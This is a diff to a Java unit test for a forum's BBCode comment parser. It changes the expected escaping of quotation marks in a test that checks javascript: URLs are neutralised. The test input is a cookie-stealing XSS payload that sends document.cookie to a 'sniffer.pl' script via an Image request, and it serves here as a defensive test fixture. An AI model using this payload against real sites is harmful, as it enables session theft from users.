@@ -46,7 +46,7 @@ public class OldParserTest {
   public void urlEscapeTest() {
     assertEquals("<p><s title=\"javascript:var c=new Image();c.src=&quot;http://127.0.0.1/sniffer.pl?&quot;+document.cookie;close()\">Test</s></p>",
         lorCodeService.parseComment("[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]Test[/url]", false, false));
-    assertEquals("<p><s>javascript:var c=new Image();c.src=&quot;http://127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s></p>",
+    assertEquals("<p><s>javascript:var c=new Image();c.src=&laquo;http://127.0.0.1/sniffer.pl?&raquo;+document.cookie;close()</s></p>",
         lorCodeService.parseComment("[url]javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()[/url]", false, false));
   }
 
